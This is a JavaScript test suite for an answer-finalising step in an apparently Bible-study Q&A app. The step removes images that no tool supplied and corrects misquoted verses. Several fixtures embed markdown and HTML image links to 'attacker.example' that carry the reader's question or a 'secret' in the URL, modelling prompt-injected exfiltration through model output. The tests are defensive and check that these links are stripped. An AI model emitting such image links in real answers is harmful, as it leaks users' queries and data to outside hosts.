import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { build } from "esbuild";

// Every Ask answer passes one final step (src/answer-final.ts) before a reader sees it or it is kept:
// pictures only from this run's tools (OWASP LLM05/LLM02), Scripture quotes checked (LLM09).
// Placeholder verse text only: no Scripture is written here.
const out = new URL("./.build/answer-final.mjs", import.meta.url).pathname;
await build({ entryPoints: [new URL("../src/answer-final.ts", import.meta.url).pathname], bundle: true, format: "esm", platform: "node", packages: "external", outfile: out, logLevel: "error", plugins: [{ name: "data", setup(b) {
  b.onResolve({ filter: /^\.\/data$/ }, () => ({ path: "data", namespace: "fixture" }));
  b.onLoad({ filter: /.*/, namespace: "fixture" }, () => ({ loader: "js", contents:
    `export async function books(env) { env.lookups.push("books"); return [{ book: "Exodus", slug: "exodus", chapters: 40 }]; }
     export async function chapter(env, slug, ch) { env.lookups.push(slug + "/" + ch); return { verses: [{ verse: 14, text: "Placeholder verse text for the test." }] }; }` }));
} }] });
const { finalAnswer, onlyGivenPictures, picturesIn, passageEvidence } = await import(out);
const env = () => ({ lookups: [] });

test("a picture a tool gave is kept; any other image becomes its alt text", async () => {
  const evidence = ["Person: Placeholder. Picture: /people/placeholder.jpg", "Timeline: x. Picture: /timeline/a.png (caption)"];
  const answer = [
    "Intro.",
    "![The given picture](/people/placeholder.jpg)",
    "![Second given](/timeline/a.png)",
    "![leak](https://attacker.example/?q=the+reader+question)",
    "![same host, other path](/people/other.jpg)",
    '![titled](/people/placeholder.jpg?x=1 "t")',
    "![ref style][1]",
    '<img src="https://attacker.example/p.gif">',
    "End.",
  ].join("\n");
  const e = env();
  const text = await finalAnswer(e, answer, { evidence });
  assert.match(text, /!\[The given picture\]\(\/people\/placeholder\.jpg\)/);
  assert.match(text, /!\[Second given\]\(\/timeline\/a\.png\)/);
  assert.doesNotMatch(text, /attacker|other\.jpg|\?x=1|<img|!\[ref style\]/);
  for (const alt of ["leak", "same host, other path", "titled", "ref style"]) assert.ok(text.split("\n").includes(alt), `alt kept: ${alt}`);
  assert.deepEqual(e.lookups, [], "no Scripture quote, so no lookup");
});

test("with no tool picture at all, every image is dropped, and text without images is untouched", async () => {
  assert.equal((await finalAnswer(env(), "![x](/people/a.jpg) text")), "x text");
  const plain = "Plain words [1], a link [here](/classes/a) and no images.";
  assert.equal(await finalAnswer(env(), plain), plain, "a normal link is not an image");
  assert.equal(onlyGivenPictures("![a]()", new Set()).text, "a");
});

test("picture addresses come only from the run's own tool text and passages", () => {
  assert.deepEqual([...picturesIn(["a Picture: /p/1.jpg, and Picture: /p/2.png.", null, undefined, "Picture:/p/3.jpg"])], ["/p/1.jpg", "/p/2.png", "/p/3.jpg"]);
  assert.deepEqual(passageEvidence([{ title: "T", text: "Picture: /p.jpg" }]), ["T", "Picture: /p.jpg"]);
});

test("a misquoted verse is corrected to the King James text in the final step", async () => {
  const e = env();
  const text = await finalAnswer(e, "Intro.\n> Words the model made up. **Exodus 12:14**\nEnd.");
  assert.match(text, /^> Placeholder verse text for the test\. \*\*Exodus 12:14\*\*/m);
  assert.doesNotMatch(text, /made up/);
  assert.deepEqual(e.lookups, ["books", "exodus/12"]);
});

// The answer paths in ai.ts. Each answer a model wrote must pass finalAnswer; each other answer is a
// fixed sentence or an owner-approved answer (itself passed through finalAnswer by approvedFinal).
// A new path changes this list, so it has to be classified here on purpose.
const ai = readFileSync(new URL("../src/ai.ts", import.meta.url), "utf8");
function answerFields(src) {
  const found = [];
  for (const m of src.matchAll(/\{\s*(ok: true|done: true)\b/g)) {
    let depth = 0, i = m.index;
    for (; i < src.length; i++) { const c = src[i]; if ("{([".includes(c)) depth++; else if ("})]".includes(c) && --depth === 0) break; }
    let d = 0, cur = ""; const props = [];
    for (const c of src.slice(m.index + 1, i)) { if ("{([".includes(c)) d++; if ("})]".includes(c)) d--; if (c === "," && d === 0) { props.push(cur.trim()); cur = ""; } else cur += c; }
    props.push(cur.trim());
    const a = props.find((p) => /^answer\b/.test(p));
    if (a) found.push(`${m[1]} ${a.replace(/\s+/g, " ")}`);
  }
  return found.sort();
}

test("every answer path in ai.ts is a final answer, a fixed sentence or an approved answer", () => {
  assert.deepEqual(answerFields(ai), [
    // Shorthand `answer` / `clean`: bound by `= await finalAnswer(` (checked below).
    "done: true answer", "done: true answer", "done: true answer: approved.answer", "done: true answer: clean", "done: true answer: gap.answer",
    "ok: true answer", "ok: true answer", "ok: true answer", "ok: true answer",
    // Fixed sentences no model wrote: notInTheClasses (gap, none) and the two "no cited answer" lines.
    'ok: true answer: "The search did not find enough reliable material in the library to answer that question."',
    "ok: true answer: approved.answer", "ok: true answer: approved.answer",
    'ok: true answer: gap ? "I could not find material answering this directly." : "I could not produce a cited answer from the library material I found."',
    "ok: true answer: gap.answer", "ok: true answer: none.answer",
  ].sort());
  // Each model-written answer variable is assigned from finalAnswer, and nothing else names a draft as the answer.
  assert.equal((ai.match(/const answer = await finalAnswer\(/g) ?? []).length, 4, "ask (agent, backup), the app agent and askStream with research");
  assert.equal((ai.match(/const clean = await finalAnswer\(/g) ?? []).length, 1, "askStream backup");
  assert.match(ai, /return \{ answer: await finalAnswer\(env, answer,/, "the bounded answer's clean()");
  assert.match(ai, /answer: await finalAnswer\(env, study\.answer,/, "the study answer");
  // Every approved answer goes through approvedFinal; approvedFor's raw result is never answered.
  assert.equal((ai.match(/approvedFor\(/g) ?? []).length, (ai.match(/const approvedRaw = approvedFor\(/g) ?? []).length, "approvedFor is only ever called as approvedRaw");
  assert.equal((ai.match(/const approved = approvedRaw && await approvedFinal\(env, approvedRaw\);/g) ?? []).length, 3);
  // The verse check lives only in the final step.
  assert.doesNotMatch(ai, /guardVerses|checkedVerses/);
  // Every research run passes its evidence list, so a tool's picture can be recognised.
  assert.equal((ai.match(/runAgent\(/g) ?? []).length, (ai.match(/deadlineAt: [^}]*, evidence \}/g) ?? []).length);
});

// End to end on the app's agent path, with the agent standing in: an image the tools never gave is
// dropped before the reader's final text and before the answer is kept; the tool's own picture stays.
const kv = () => { const m = new Map(); return { m, get: async (k) => m.get(k) ?? null, put: async (k, v) => { m.set(k, v); }, delete: async (k) => { m.delete(k); } }; };
const { DatabaseSync } = await import("node:sqlite");
const d1 = () => { const db = new DatabaseSync(":memory:"); const bound = (q, a) => ({ first: async () => db.prepare(q).get(...a) ?? null, all: async () => ({ results: db.prepare(q).all(...a) }), run: async () => { if (/RETURNING/i.test(q)) { const results = db.prepare(q).all(...a); return { results, meta: { changes: results.length } }; } const r = db.prepare(q).run(...a); return { results: [], meta: { changes: Number(r.changes ?? 0) } }; } }); return { prepare: (q) => ({ bind: (...a) => bound(q, a), ...bound(q, []) }), batch: async (s) => Promise.all(s.map((x) => x.run())) }; };
const aiOut = new URL("./.build/answer-final-ai.mjs", import.meta.url).pathname;
await build({ stdin: { contents: 'export { answerAppAgent } from "./src/ai.ts";', resolveDir: new URL("..", import.meta.url).pathname, loader: "ts" }, bundle: true, format: "esm", platform: "node", packages: "external", outfile: aiOut, logLevel: "error", plugins: [{ name: "agent", setup(b) {
  b.onResolve({ filter: /^\.\/agent$/ }, (args) => args.importer.endsWith("ai.ts") ? { path: "agent", namespace: "fixture" } : undefined);
  b.onLoad({ filter: /.*/, namespace: "fixture" }, () => ({ loader: "js", contents:
    `export async function runAgent(env, q, h, f, r, emit, ctx, uid, model, spend, res, rounds, cite, control) {
       control.evidence.push("Person: Placeholder. Picture: /people/placeholder.jpg");
       emit({ delta: env.draft });
       return { text: env.draft, units: 0, calls: 1, cut: false, refused: false, grounded: true, actions: [], plan: null, tracked: false,
         passages: [{ n: 1, kind: "note", title: "A class", url: "/classes/a", text: "Recorded class words." }] }; }
     export const claudeUnavailable = () => false; export const alertClaudeFunds = async () => {};` }));
} }] });
const { answerAppAgent } = await import(aiOut);

test("the app's agent answer passes the final step: an injected image is dropped, the reader gets the final text", async () => {
  const draft = "Keep it [1].\n\n![Placeholder](/people/placeholder.jpg)\n\n![x](https://attacker.example/?q=secret)";
  const env = { DB: d1(), SUBS: kv(), PRIVACY_KEY: "test-key", AI_GATEWAY: "fixture", draft,
    ASK_FREE_MODEL: "@cf/google/gemma-4-26b-a4b-it", ASK_FREE_MODELS: "@cf/google/gemma-4-26b-a4b-it",
    AI: { run: async () => ({ data: [[0.1, 0.2]] }) }, VEC: { query: async () => ({ matches: [] }) } };
  const events = [];
  const r = await answerAppAgent(env, "Why do we keep the Passover?", "acct-final", [], ["Cloudflare (Workers AI)"], { emit: (e) => events.push(e) });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.doesNotMatch(r.answer, /attacker/);
  assert.match(r.answer, /!\[Placeholder\]\(\/people\/placeholder\.jpg\)/);
  assert.deepEqual(events.slice(-2), [{ reset: true }, { delta: r.answer }], "the streamed draft is replaced by the final text");
  const kept = [...env.SUBS.m.entries()].filter(([k]) => k.startsWith("ask_cache:")).map(([, v]) => v);
  assert.equal(kept.length, 1);
  assert.doesNotMatch(kept[0], /attacker/, "the cache keeps only the final text");
});
